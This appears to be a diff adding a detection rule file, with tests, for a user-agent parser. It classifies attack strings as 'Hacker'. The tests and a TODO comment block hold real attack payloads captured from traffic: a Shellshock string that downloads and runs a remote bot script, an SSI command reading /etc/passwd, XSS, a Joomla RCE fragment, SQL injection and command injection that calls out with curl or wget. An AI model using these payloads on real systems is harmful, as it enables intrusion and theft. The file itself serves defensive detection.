@@ -1,0 +1,532 @@
+#
+# Yet Another UserAgent Analyzer
+# Copyright (C) 2013-2016 Niels Basjes
+#
+# This program is free software: you can redistribute it and/or modify
+# it under the terms of the GNU General Public License as published by
+# the Free Software Foundation, either version 3 of the License, or
+# (at your option) any later version.
+#
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with this program.  If not, see <http://www.gnu.org/licenses/>.
+#
+
+config:
+
+  - matcher:
+      require:
+        - 'agent{"() {"'
+      extract:
+         - 'DeviceClass           :   10000:"Hacker"'
+         - 'DeviceBrand           :   10000:"Hacker"'
+         - 'DeviceName            :   10000:"Hacker"'
+         - 'OperatingSystemClass  :   10000:"Hacker"'
+         - 'OperatingSystemName   :   10000:"Hacker"'
+         - 'OperatingSystemVersion:   10000:"Hacker"'
+         - 'LayoutEngineClass     :   10000:"Hacker"'
+         - 'LayoutEngineName      :   10000:"Hacker"'
+         - 'LayoutEngineVersion   :   10000:"Hacker"'
+         - 'AgentClass            :   10000:"Hacker"'
+         - 'AgentName             :   10000:"Hacker"'
+         - 'AgentVersion          :   10000:"Hacker"'
+         - 'HackerAttackVector    :   10000:"Shell Shock"'
+
+  - test:
+      input:
+        user_agent_string: '() { :;}; /bin/bash -c \""wget -O /tmp/bbb ons.myftp.org/bot.txt; perl /tmp/bbb\""'
+      expected:
+        DeviceClass                        : 'Hacker'
+        DeviceBrand                        : 'Hacker'
+        DeviceName                         : 'Hacker'
+        OperatingSystemClass               : 'Hacker'
+        OperatingSystemName                : 'Hacker'
+        OperatingSystemVersion             : 'Hacker'
+        LayoutEngineClass                  : 'Hacker'
+        LayoutEngineName                   : 'Hacker'
+        LayoutEngineVersion                : 'Hacker'
+        AgentClass                         : 'Hacker'
+        AgentName                          : 'Hacker'
+        AgentVersion                       : 'Hacker'
+        HackerAttackVector                 : 'Shell Shock'
+
+  - test:
+      input:
+        user_agent_string: '"() { ignored; }; echo Content-Type: text/plain ; echo ; echo \""bash_cve_2014_6271_rce Output : $((11+70))\"""'
+      expected:
+        DeviceClass                        : 'Hacker'
+        DeviceBrand                        : 'Hacker'
+        DeviceName                         : 'Hacker'
+        OperatingSystemClass               : 'Hacker'
+        OperatingSystemName                : 'Hacker'
+        OperatingSystemVersion             : 'Hacker'
+        LayoutEngineClass                  : 'Hacker'
+        LayoutEngineName                   : 'Hacker'
+        LayoutEngineVersion                : 'Hacker'
+        AgentClass                         : 'Hacker'
+        AgentName                          : 'Hacker'
+        AgentVersion                       : 'Hacker'
+        HackerAttackVector                 : 'Shell Shock'
+
+  - matcher:
+      require:
+        - 'agent~"<script>"'
+      extract:
+        - 'DeviceClass           :   10000:"Hacker"'
+        - 'DeviceBrand           :   10000:"Hacker"'
+        - 'DeviceName            :   10000:"Hacker"'
+        - 'OperatingSystemClass  :   10000:"Hacker"'
+        - 'OperatingSystemName   :   10000:"Hacker"'
+        - 'OperatingSystemVersion:   10000:"Hacker"'
+        - 'LayoutEngineClass     :   10000:"Hacker"'
+        - 'LayoutEngineName      :   10000:"Hacker"'
+        - 'LayoutEngineVersion   :   10000:"Hacker"'
+        - 'AgentClass            :   10000:"Hacker"'
+        - 'AgentName             :   10000:"Hacker"'
+        - 'AgentVersion          :   10000:"Hacker"'
+        - 'HackerAttackVector    :   10000:"Javascript"'
+
+  - test:
+      input:
+        user_agent_string: 'Mozilla/4.0 ()<script>alert(''Compatible'')</script>; <script>alert(''''OS)</script>; <script>alert(''MSIE 6.0'')</script>; ()'
+      expected:
+        DeviceClass                        : 'Hacker'
+        DeviceBrand                        : 'Hacker'
+        DeviceName                         : 'Hacker'
+        OperatingSystemClass               : 'Hacker'
+        OperatingSystemName                : 'Hacker'
+        OperatingSystemVersion             : 'Hacker'
+        LayoutEngineClass                  : 'Hacker'
+        LayoutEngineName                   : 'Hacker'
+        LayoutEngineVersion                : 'Hacker'
+        AgentClass                         : 'Hacker'
+        AgentName                          : 'Hacker'
+        AgentVersion                       : 'Hacker'
+
+  - matcher:
+      require:
+        - 'agent~"nessus"'
+      extract:
+        - 'DeviceClass           :   10000:"Hacker"'
+        - 'DeviceBrand           :   10000:"Hacker"'
+        - 'DeviceName            :   10000:"Hacker"'
+        - 'OperatingSystemClass  :   10000:"Hacker"'
+        - 'OperatingSystemName   :   10000:"Hacker"'
+        - 'OperatingSystemVersion:   10000:"Hacker"'
+        - 'LayoutEngineClass     :   10000:"Hacker"'
+        - 'LayoutEngineName      :   10000:"Hacker"'
+        - 'LayoutEngineVersion   :   10000:"Hacker"'
+        - 'AgentClass            :   10000:"Hacker"'
+        - 'AgentName             :   10000:"Hacker"'
+        - 'AgentVersion          :   10000:"Hacker"'
+        - 'HackerToolkit         :   10000:"Nessus"'
+
+  - matcher:
+      require:
+        - 'agent~"#exec"'
+      extract:
+        - 'DeviceClass           :   10000:"Hacker"'
+        - 'DeviceBrand           :   10000:"Hacker"'
+        - 'DeviceName            :   10000:"Hacker"'
+        - 'OperatingSystemClass  :   10000:"Hacker"'
+        - 'OperatingSystemName   :   10000:"Hacker"'
+        - 'OperatingSystemVersion:   10000:"Hacker"'
+        - 'LayoutEngineClass     :   10000:"Hacker"'
+        - 'LayoutEngineName      :   10000:"Hacker"'
+        - 'LayoutEngineVersion   :   10000:"Hacker"'
+        - 'AgentClass            :   10000:"Hacker"'
+        - 'AgentName             :   10000:"Hacker"'
+        - 'AgentVersion          :   10000:"Hacker"'
+        - 'HackerAttackVector    :   10000:"Serverside execute"'
+
+  - matcher:
+      require:
+        - 'agent~"#include"'
+      extract:
+        - 'DeviceClass           :   10000:"Hacker"'
+        - 'DeviceBrand           :   10000:"Hacker"'
+        - 'DeviceName            :   10000:"Hacker"'
+        - 'OperatingSystemClass  :   10000:"Hacker"'
+        - 'OperatingSystemName   :   10000:"Hacker"'
+        - 'OperatingSystemVersion:   10000:"Hacker"'
+        - 'LayoutEngineClass     :   10000:"Hacker"'
+        - 'LayoutEngineName      :   10000:"Hacker"'
+        - 'LayoutEngineVersion   :   10000:"Hacker"'
+        - 'AgentClass            :   10000:"Hacker"'
+        - 'AgentName             :   10000:"Hacker"'
+        - 'AgentVersion          :   10000:"Hacker"'
+        - 'HackerAttackVector    :   10000:"Serverside include"'
+
+  - test:
+      input:
+        user_agent_string: '"nessus=<!--#exec cmd=\""cat /etc/passwd\""-->"'
+      expected:
+        DeviceClass                        : 'Hacker'
+        DeviceName                         : 'Hacker'
+        DeviceBrand                        : 'Hacker'
+        OperatingSystemClass               : 'Hacker'
+        OperatingSystemName                : 'Hacker'
+        OperatingSystemVersion             : 'Hacker'
+        LayoutEngineClass                  : 'Hacker'
+        LayoutEngineName                   : 'Hacker'
+        LayoutEngineVersion                : 'Hacker'
+        AgentClass                         : 'Hacker'
+        AgentName                          : 'Hacker'
+        AgentVersion                       : 'Hacker'
+        HackerToolkit                      : 'Nessus'
+        HackerAttackVector                 : 'Serverside execute'
+
+  - test:
+      input:
+        user_agent_string: '"<!--#exec cmd=\""cat /etc/passwd\""-->"'
+      expected:
+        DeviceClass                        : 'Hacker'
+        DeviceName                         : 'Hacker'
+        DeviceBrand                        : 'Hacker'
+        OperatingSystemClass               : 'Hacker'
+        OperatingSystemName                : 'Hacker'
+        OperatingSystemVersion             : 'Hacker'
+        LayoutEngineClass                  : 'Hacker'
+        LayoutEngineName                   : 'Hacker'
+        LayoutEngineVersion                : 'Hacker'
+        AgentClass                         : 'Hacker'
+        AgentName                          : 'Hacker'
+        AgentVersion                       : 'Hacker'
+        HackerAttackVector                 : 'Serverside execute'
+
+  - test:
+      input:
+        user_agent_string: '"nessus=<!--#include file=\""nessus405480938.html\""-->"'
+      expected:
+        DeviceClass                        : 'Hacker'
+        DeviceName                         : 'Hacker'
+        OperatingSystemClass               : 'Hacker'
+        OperatingSystemName                : 'Hacker'
+        OperatingSystemVersion             : 'Hacker'
+        LayoutEngineClass                  : 'Hacker'
+        LayoutEngineName                   : 'Hacker'
+        LayoutEngineVersion                : 'Hacker'
+        AgentClass                         : 'Hacker'
+        AgentName                          : 'Hacker'
+        AgentVersion                       : 'Hacker'
+        DeviceBrand                        : 'Hacker'
+        HackerToolkit                      : 'Nessus'
+        HackerAttackVector                 : 'Serverside include'
+
+
+  - matcher:
+      require:
+        - 'agent~"JDatabaseDriverMysqli"'
+      extract:
+        - 'DeviceClass           :   10000:"Hacker"'
+        - 'DeviceBrand           :   10000:"Hacker"'
+        - 'DeviceName            :   10000:"Hacker"'
+        - 'OperatingSystemClass  :   10000:"Hacker"'
+        - 'OperatingSystemName   :   10000:"Hacker"'
+        - 'OperatingSystemVersion:   10000:"Hacker"'
+        - 'LayoutEngineClass     :   10000:"Hacker"'
+        - 'LayoutEngineName      :   10000:"Hacker"'
+        - 'LayoutEngineVersion   :   10000:"Hacker"'
+        - 'AgentClass            :   10000:"Hacker"'
+        - 'AgentName             :   10000:"Hacker"'
+        - 'AgentVersion          :   10000:"Hacker"'
+        - 'HackerAttackVector    :   10000:"Remote exec Joomla"'
+
+
+# If there are NO products found this is either manipulated or a Hacker.
+  - matcher:
+      require:
+        - 'IsNull[agent.product]'
+        - 'IsNull[agent.url]'
+        - '__SyntaxError__="true"'
+      extract:
+        - 'DeviceClass                        : 10:"Hacker"'
+        - 'DeviceName                         : 10:"Hacker"'
+        - 'DeviceBrand                        : 10:"Hacker"'
+        - 'DeviceVersion                      : 10:"Hacker"'
+        - 'OperatingSystemClass               : 10:"Hacker"'
+        - 'OperatingSystemName                : 10:"Hacker"'
+        - 'OperatingSystemVersion             : 10:"Hacker"'
+        - 'OperatingSystemNameVersion         : 10:"Hacker"'
+        - 'LayoutEngineClass                  : 10:"Hacker"'
+        - 'LayoutEngineName                   : 10:"Hacker"'
+        - 'LayoutEngineVersion                : 10:"Hacker"'
+        - 'LayoutEngineVersionMajor           : 10:"Hacker"'
+        - 'AgentClass                         : 10:"Hacker"'
+        - 'AgentName                          : 10:"Hacker"'
+        - 'AgentVersion                       : 10:"Hacker"'
+        - 'AgentVersionMajor                  : 10:"Hacker"'
+        - 'HackerAttackVector                 : 10:"Unknown"'
+        - 'HackerToolkit                      : 10:"Unknown"'
+        - 'AgentNameVersion                   : 10:"Hacker"'
+        - 'AgentNameVersionMajor              : 10:"Hacker"'
+
+  - test:
+      input:
+        user_agent_string: 'a {'
+      expected:
+        DeviceClass                      : 'Hacker'      # 10
+        DeviceName                       : 'Hacker'      # 10
+        OperatingSystemClass             : 'Hacker'      # 10
+        OperatingSystemName              : 'Hacker'      # 10
+        OperatingSystemVersion           : 'Hacker'      # 10
+        LayoutEngineClass                : 'Hacker'      # 10
+        LayoutEngineName                 : 'Hacker'      # 10
+        LayoutEngineVersion              : 'Hacker'      # 10
+        LayoutEngineVersionMajor         : 'Hacker'      # 10
+        AgentClass                       : 'Hacker'      # 10
+        AgentName                        : 'Hacker'      # 10
+        AgentVersion                     : 'Hacker'      # 10
+        AgentVersionMajor                : 'Hacker'      # 10
+        AgentNameVersion                 : 'Hacker'      # 10
+        AgentNameVersionMajor            : 'Hacker'      # 10
+        DeviceBrand                      : 'Hacker'      # 10
+        DeviceVersion                    : 'Hacker'      # 10
+        HackerAttackVector               : 'Unknown'     # 10
+        HackerToolkit                    : 'Unknown'     # 10
+        LayoutEngineNameVersion          : 'Hacker'      # 10
+        LayoutEngineNameVersionMajor     : 'Hacker'      # 10
+        OperatingSystemNameVersion       : 'Hacker'      # 10
+
+
+
+# Completely empty --> must be hacker.
+  - test:
+      input:
+        user_agent_string: ''
+      expected:
+        DeviceClass                      : 'Hacker'      # 10
+        DeviceName                       : 'Hacker'      # 10
+        DeviceBrand                      : 'Hacker'      # 10
+        DeviceVersion                    : 'Hacker'      # 10
+        OperatingSystemClass             : 'Hacker'      # 10
+        OperatingSystemName              : 'Hacker'      # 10
+        OperatingSystemVersion           : 'Hacker'      # 10
+        OperatingSystemNameVersion       : 'Hacker'      # 10
+        LayoutEngineClass                : 'Hacker'      # 10
+        LayoutEngineName                 : 'Hacker'      # 10
+        LayoutEngineVersion              : 'Hacker'      # 10
+        LayoutEngineVersionMajor         : 'Hacker'      # 10
+        LayoutEngineNameVersion          : 'Hacker'      # 10
+        LayoutEngineNameVersionMajor     : 'Hacker'      # 10
+        AgentClass                       : 'Hacker'      # 10
+        AgentName                        : 'Hacker'      # 10
+        AgentVersion                     : 'Hacker'      # 10
+        AgentVersionMajor                : 'Hacker'      # 10
+        AgentNameVersion                 : 'Hacker'      # 10
+        AgentNameVersionMajor            : 'Hacker'      # 10
+        HackerAttackVector               : 'Unknown'     # 10
+        HackerToolkit                    : 'Unknown'     # 10
+
+
+  - matcher:
+      require:
+        - 'agent{"("'
+      extract:
+        - 'DeviceClass                        : 10:"Hacker"'
+        - 'DeviceName                         : 10:"Hacker"'
+        - 'DeviceBrand                        : 10:"Hacker"'
+        - 'DeviceVersion                      : 10:"Hacker"'
+        - 'OperatingSystemClass               : 10:"Hacker"'
+        - 'OperatingSystemName                : 10:"Hacker"'
+        - 'OperatingSystemVersion             : 10:"Hacker"'
+        - 'OperatingSystemNameVersion         : 10:"Hacker"'
+        - 'LayoutEngineClass                  : 10:"Hacker"'
+        - 'LayoutEngineName                   : 10:"Hacker"'
+        - 'LayoutEngineVersion                : 10:"Hacker"'
+        - 'LayoutEngineVersionMajor           : 10:"Hacker"'
+        - 'AgentClass                         : 10:"Hacker"'
+        - 'AgentName                          : 10:"Hacker"'
+        - 'AgentVersion                       : 10:"Hacker"'
+        - 'AgentVersionMajor                  : 10:"Hacker"'
+        - 'HackerAttackVector                 : 10:"Unknown"'
+        - 'HackerToolkit                      : 10:"Unknown"'
+        - 'AgentNameVersion                   : 10:"Hacker"'
+        - 'AgentNameVersionMajor              : 10:"Hacker"'
+
+
+  - test:
+      input:
+        user_agent_string: '"}__test|O:21:\""JDatabaseDriverMysqli\"":3:{s:2:\""fc\"";O:17:\""JSimplepieFactory\"":0:{}s:21:\" Useragent was cut"'
+      expected:
+        DeviceClass                        : 'Hacker'
+        DeviceName                         : 'Hacker'
+        DeviceBrand                        : 'Hacker'
+        OperatingSystemClass               : 'Hacker'
+        OperatingSystemName                : 'Hacker'
+        OperatingSystemVersion             : 'Hacker'
+        LayoutEngineClass                  : 'Hacker'
+        LayoutEngineName                   : 'Hacker'
+        LayoutEngineVersion                : 'Hacker'
+        AgentClass                         : 'Hacker'
+        AgentName                          : 'Hacker'
+        AgentVersion                       : 'Hacker'
+        HackerAttackVector                 : 'Remote exec Joomla'
+
+
+  - test:
+      input:
+        user_agent_string: "-7928') AS oPZe WHERE 1230=1230 OR MAKE_SET(2577=2472,2472)--"
+      expected:
+        DeviceClass                        : 'Hacker'      # 1
+        DeviceName                         : 'Hacker'      # 1
+        OperatingSystemClass               : 'Hacker'      # 1
+        OperatingSystemName                : 'Hacker'      # 1
+        OperatingSystemVersion             : 'Hacker'      # 1
+        LayoutEngineClass                  : 'Hacker'      # 1
+        LayoutEngineName                   : 'Hacker'      # 1
+        LayoutEngineVersion                : 'Hacker'      # 1
+        LayoutEngineVersionMajor           : 'Hacker'      # 1
+        AgentClass                         : 'Hacker'      # 1
+        AgentName                          : 'Hacker'      # 1
+        AgentVersion                       : 'Hacker'      # 1
+        AgentVersionMajor                  : 'Hacker'      # 1
+        DeviceBrand                        : 'Hacker'      # 1
+        HackerAttackVector                 : 'Unknown'     # 1
+        HackerToolkit                      : 'Unknown'     # 1
+        OperatingSystemNameVersion         : 'Hacker'      # 1
+
+  - test:
+      input:
+        user_agent_string: "true <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF' || curl -X POST"
+      expected:
+        DeviceClass                        : 'Hacker'      # 10
+        DeviceName                         : 'Hacker'      # 10
+        OperatingSystemClass               : 'Hacker'      # 10
+        OperatingSystemName                : 'Hacker'      # 10
+        OperatingSystemVersion             : 'Hacker'      # 10
+        LayoutEngineClass                  : 'Hacker'      # 10
+        LayoutEngineName                   : 'Hacker'      # 10
+        LayoutEngineVersion                : 'Hacker'      # 10
+        LayoutEngineVersionMajor           : 'Hacker'      # 10
+        AgentClass                         : 'Hacker'      # 10
+        AgentName                          : 'Hacker'      # 10
+        AgentVersion                       : 'Hacker'      # 10
+        AgentVersionMajor                  : 'Hacker'      # 10
+        DeviceBrand                        : 'Hacker'      # 10
+        HackerAttackVector                 : 'Unknown'     # 10
+        HackerToolkit                      : 'Unknown'     # 10
+        OperatingSystemNameVersion         : 'Hacker'      # 10
+
+
+  - test:
+      input:
+        user_agent_string: '${9999072+10000055}'
+      expected:
+        DeviceClass                        : 'Hacker'      # 10
+        DeviceName                         : 'Hacker'      # 10
+        OperatingSystemClass               : 'Hacker'      # 10
+        OperatingSystemName                : 'Hacker'      # 10
+        OperatingSystemVersion             : 'Hacker'      # 10
+        LayoutEngineClass                  : 'Hacker'      # 10
+        LayoutEngineName                   : 'Hacker'      # 10
+        LayoutEngineVersion                : 'Hacker'      # 10
+        LayoutEngineVersionMajor           : 'Hacker'      # 10
+        AgentClass                         : 'Hacker'      # 10
+        AgentName                          : 'Hacker'      # 10
+        AgentVersion                       : 'Hacker'      # 10
+        AgentVersionMajor                  : 'Hacker'      # 10
+        DeviceBrand                        : 'Hacker'      # 10
+        HackerAttackVector                 : 'Unknown'     # 10
+        HackerToolkit                      : 'Unknown'     # 10
+        OperatingSystemNameVersion         : 'Hacker'      # 10
+
+
+
+  - test:
+      input:
+        user_agent_string: '${@print(md5(acunetix_wvs_security_test))}\'
+      expected:
+        DeviceClass                        : 'Hacker'      # 10
+        DeviceName                         : 'Hacker'      # 10
+        OperatingSystemClass               : 'Hacker'      # 10
+        OperatingSystemName                : 'Hacker'      # 10
+        OperatingSystemVersion             : 'Hacker'      # 10
+        LayoutEngineClass                  : 'Hacker'      # 10
+        LayoutEngineName                   : 'Hacker'      # 10
+        LayoutEngineVersion                : 'Hacker'      # 10
+        LayoutEngineVersionMajor           : 'Hacker'      # 10
+        AgentClass                         : 'Hacker'      # 10
+        AgentName                          : 'Hacker'      # 10
+        AgentVersion                       : 'Hacker'      # 10
+        AgentVersionMajor                  : 'Hacker'      # 10
+        DeviceBrand                        : 'Hacker'      # 10
+        HackerAttackVector                 : 'Unknown'     # 10
+        HackerToolkit                      : 'Unknown'     # 10
+        OperatingSystemNameVersion         : 'Hacker'      # 10
+
+  - test:
+      input:
+        user_agent_string: '(select convert(int,CHAR(65)))'
+      expected:
+        DeviceClass                        : 'Hacker'      # 10
+        DeviceName                         : 'Hacker'      # 10
+        OperatingSystemClass               : 'Hacker'      # 10
+        OperatingSystemName                : 'Hacker'      # 10
+        OperatingSystemVersion             : 'Hacker'      # 10
+        LayoutEngineClass                  : 'Hacker'      # 10
+        LayoutEngineName                   : 'Hacker'      # 10
+        LayoutEngineVersion                : 'Hacker'      # 10
+        LayoutEngineVersionMajor           : 'Hacker'      # 10
+        AgentClass                         : 'Hacker'      # 10
+        AgentName                          : 'Hacker'      # 10
+        AgentVersion                       : 'Hacker'      # 10
+        AgentVersionMajor                  : 'Hacker'      # 10
+        DeviceBrand                        : 'Hacker'      # 10
+        HackerAttackVector                 : 'Unknown'     # 10
+        HackerToolkit                      : 'Unknown'     # 10
+        OperatingSystemNameVersion         : 'Hacker'      # 10
+
+
+# TODO:
+#-8067)) AS trzU WHERE 3801=3801 OR MAKE_SET(7172=7172,6095)--
+#-2734')) AS YnXr WHERE 1760=1760 OR MAKE_SET(7172=7172,6095)--
+#-3358'))) OR MAKE_SET(9429=7340,7340) AND ((('QIPX' LIKE 'QIPX
+#-3596'))) OR MAKE_SET(7172=7172,6095) AND ((('CIqS' LIKE 'CIqS
+#-8939')) AS nIoD WHERE 8404=8404 OR MAKE_SET(6157=2589,2589)--
+#-9639'))) OR 4729=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(107)||CHR(106)||CHR(118)||CHR(113)||(SELECT (CASE WHEN (4729=4729) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(118)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND ((('jLCJ' LIKE 'jLCJ
+#-1 OR 2+347-347-1=0+0+0+1
+#-1 OR 2+150-150-1=0+0+0+1 --
+#true <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF' || wget
+#
+#${9999072+10000055}
+#${9999227+9999251}
+#${9999754+9999339}
+#${@print(md5(acunetix_wvs_security_test))}
+#${@print(md5(acunetix_wvs_security_test))}\
+#"";print(md5(acunetix_wvs_security_test));$a=""
+#
+#-9987%' OR 5271=5271 AND '%'='
+#-9992' OR 8054=CTXSYS.DRITHSX.SN(8054,(CHR(113)||CHR(107)||CHR(106)||CHR(118)||CHR(113)||(SELECT (CASE WHEN (8054=8054) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(118)||CHR(118)||CHR(113))) AND 'YmZM
+#"-9998\"" OR 5520=('qkjvq'||(SELECT CASE 5520 WHEN 5520 THEN 1 ELSE 0 END FROM RDB$DATABASE)||'qzvvq') AND \""frsm\"" LIKE \""frsm"
+#9Sc35aAu'));select pg_sleep(9); --
+#8JInzfdL'; waitfor delay '0:0:6' --
+#8KMHl9gr';select pg_sleep(3); --
+#"-8881\"" OR MAKE_SET(7172=7172,6095) AND \""HpsH\""=\""HpsH"
+#-8652 OR 4729=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(107)||CHR(106)||CHR(118)||CHR(113)||(SELECT (CASE WHEN (4729=4729) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(118)||CHR(118)||CHR(1
+#(CASE WHEN 6209=6209 THEN 6209 ELSE NULL END)
+#(CASE WHEN 8578=7618 THEN 8578 ELSE NULL END)
+#(CAST((CHR(113)||CHR(107)||CHR(106)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (1300=1300) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(118)||CHR(118)||CHR(113)) AS NUMERIC))
+#(CAST((CHR(113)||CHR(107)||CHR(106)||CHR(118)||CHR(113))||(SELECT 1 FROM GENERATE_SERIES(9085,9085,CASE WHEN (9085=9085) THEN 1 ELSE 0 END) LIMIT 1)::text||(CHR(113)||CHR(122)||CHR(118)||CHR(118)||CHR(113)) AS NUMERIC))
+#(compatible;
+#(compatible; MSIE 9.0; ; Trident/5.0; BOIE9;NLBE)
+#(CONVERT(INT,(SELECT CHAR(113)+CHAR(107)+CHAR(106)+CHAR(118)+CHAR(113)+(SELECT (CASE WHEN (3384=3384) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(118)+CHAR(118)+CHAR(113))))
+#(DreamPassport/3.0; isao/MyDiGiRabi)
+#(EXTRACTVALUE(6481,CONCAT(0x5c,0x716b6a7671,(SELECT (ELT(6481=6481,1))),0x717a767671)))
+#(for x in {1..200} ; do echo ""for x$x in ; do :""; done; for x in {1..200} ; do echo done ; done) | bash ||%0A/usr/bin/curl -X POST https://www.tinfoilsecurity.com/scanner_phone_home/913c8c97-a67a-49bf-811b-c70ab6252eca
+#(for x in {1..200} ; do echo ""for x$x in ; do :""; done; for x in {1..200} ; do echo done ; done) | bash ||%0A/usr/bin/curl -X POST https://www.tinfoilsecurity.com/scanner_phone_home/913c8c97-a67a-49bf-811b-c70ab6252eca%00
+#(for x in {1..200} ; do echo ""for x$x in ; do :""; done; for x in {1..200} ; do echo done ; done) | bash ||%0A/usr/bin/curl -X POST https://www.tinfoilsecurity.com/scanner_phone_home/a4009663-272d-4b00-9e52-98f4700aa5a7
+#(for x in {1..200} ; do echo ""for x$x in ; do :""; done; for x in {1..200} ; do echo done ; done) | bash ||%0A/usr/bin/curl -X POST https://www.tinfoilsecurity.com/scanner_phone_home/a4009663-272d-4b00-9e52-98f4700aa5a7%00
+#(for x in {1..200} ; do echo ""for x$x in ; do :""; done; for x in {1..200} ; do echo done ; done) | bash ||%0A/usr/bin/wget https://www.tinfoilsecurity.com/scanner_phone_home/913c8c97-a67a-49bf-811b-c70ab6252eca --method POST -O /dev/null -q
+#(for x in {1..200} ; do echo ""for x$x in ; do :""; done; for x in {1..200} ; do echo done ; done) | bash ||%0A/usr/bin/wget https://www.tinfoilsecurity.com/scanner_phone_home/913c8c97-a67a-49bf-811b-c70ab6252eca --method POST -O /dev/null -q%00
+#(for x in {1..200} ; do echo ""for x$x in ; do :""; done; for x in {1..200} ; do echo done ; done) | bash ||%0A/usr/bin/wget https://www.tinfoilsecurity.com/scanner_phone_home/a4009663-272d-4b00-9e52-98f4700aa5a7 --method POST -O /dev/null -q
+#(for x in {1..200} ; do echo ""for x$x in ; do :""; done; for x in {1..200} ; do echo done ; done) | bash ||%0A/usr/bin/wget https://www.tinfoilsecurity.com/scanner_phone_home/a4009663-272d-4b00-9e52-98f4700aa5a7 --method POST -O /dev/null -q%00
+#(for x in {1..200} ; do echo ""for x$x in ; do :""; done; for x in {1..200} ; do echo done ; done) | bash ||%0A/usr/local/bin/curl -X POST https://www.tinfoilsecurity.com/scanner_phone_home/913c8c97-a67a-49bf-811b-c70ab6252eca
+#(SELECT (CHR(113)||CHR(107)||CHR(106)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (9479=9479) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(118)||CHR(118)||CHR(113)))
+#(SELECT (CASE WHEN (9814=1041) THEN CHAR(115)+CHAR(113)+CHAR(108)+CHAR(109)+CHAR(97)+CHAR(112)+CHAR(47)+CHAR(49)+CHAR(46)+CHAR(48)+CHAR(45)+CHAR(100)+CHAR(101)+CHAR(118)+CHAR(45)+CHAR(110)+CHAR(111)+CHAR(110)+CHAR(103)+CHAR(105)+CHAR(116)+CHAR(45)+CHAR(50)+CHAR(48)+CHAR(49)+CHAR(53)+CHAR(48)+CHAR(57)+CHAR(48)+CHAR(57)+CHAR(32)+CHAR(40)+CHAR(104)+CHAR(116)+CHAR(116)+CHAR(112)+CHAR(58)+CHAR(47)+CHAR(47)+CHAR(115)+CHAR(113)+CHAR(108)+CHAR(109)+CHAR(97)+CHAR(112)+CHAR(46)+CHAR(111)+CHAR(114)+CHAR(103)+CHAR(41) ELSE 9814*(SELECT 9814 FROM master..sysdatabases) END))
+#(select convert(int,CHAR(65)))
+#(UPDATEXML(2046,CONCAT(0x2e,0x716b6a7671,(SELECT (ELT(2046=2046,1))),0x717a767671),5014))
